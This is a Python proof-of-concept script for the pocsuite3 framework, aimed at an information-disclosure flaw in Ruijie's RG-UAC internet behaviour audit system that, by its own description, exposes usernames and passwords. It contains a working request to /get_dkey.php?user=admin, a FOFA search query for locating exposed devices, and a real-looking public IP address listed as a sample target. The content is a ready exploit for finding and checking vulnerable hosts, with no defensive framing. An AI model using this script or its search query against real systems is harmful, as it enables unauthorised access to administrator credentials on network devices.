from pocsuite3.api import Output, POCBase, register_poc, requests, logger, VUL_TYPE, POC_CATEGORY
#import re

class DemoPOC(POCBase):
    vulID = ''  # ssvid
    version = '1.0'
    name = '锐捷统一上网行为管理与审计系统_信息泄露'
    appName = '锐捷'
    vulType = VUL_TYPE.INFORMATION_DISCLOSURE
    desc = '''
        锐捷统一上网行为管理与审计系统_信息泄露 
        可查看用户名及密码
        FOFA搜索 title="rg-uac"
        '''
    category = POC_CATEGORY.EXPLOITS.WEBAPP
    samples = ['https://112.18.226.64:8443']

    def _verify(self):
        result = {}
        target = self.url + "/get_dkey.php?user=admin"
        try:
            r1 = requests.get(target,allow_redirects=True,verify=False)
            if "password" in r1.text and r1.status_code == 200: 
                result['VerifyInfo'] = {}
                result['VerifyInfo']['URL'] = self.url
                logger.info('存在信息泄露：'+target)

        except Exception as e:
            logger.error(e)
        return self.parse_output(result)

    def _attack(self):
        return self._verify()

    def parse_output(self, result):
        output = Output(self)
        if result:
            output.success(result)
        else:
            output.fail('Target is not vulnerable')
        return output

register_poc(DemoPOC)